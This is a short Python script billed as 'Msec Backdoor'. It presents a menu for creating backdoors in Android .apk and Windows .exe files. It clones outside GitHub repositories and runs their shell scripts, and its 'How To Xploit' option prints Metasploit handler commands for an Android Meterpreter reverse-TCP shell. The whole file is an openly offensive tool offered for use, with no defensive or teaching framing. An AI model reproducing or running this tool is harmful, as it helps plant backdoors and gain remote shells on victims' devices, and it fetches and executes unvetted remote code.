import time
import os
import sys

os.system("clear")
os.system("toilet -f future Msec Backdoor")
print("Creating By ./RedSec")
print("My Partner is Zora Ideale")
print
print("====================================")
print("[1] Create Backdoor For Android .apk")
print("[2] Create Backdoor For Windows .exe")
print
print("[99] ifconfig")
print("[00] How To Xploit")
print("====================================")
print
Pilih = raw_input ('Input Your Number => ')
if Pilih =="1":
   os.system("git clone https://github.com/hjprihatini/msec-andro.git")
   os.system("bash msec-andro/msec-andro.sh")
if Pilih =="2":
   os.system("git clone https://github.com/hjprihatini/msec-win")
   os.system("bash msec-win/msec-win.sh")
if Pilih =="99":
   os.system("ifconfig")
if Pilih =="00":
   print
   print("msf  > use exploit/multi/handler")
   print("msf exploit (handler) > set payload android/meterpreter/reverse_tcp")
   print("msf exploit (handler) > set lhost ( Your ip earlier )")
   print("msf exploit (handler) > set lport ( Your Port Was )")
   print("msf exploit (handler) > exploit")
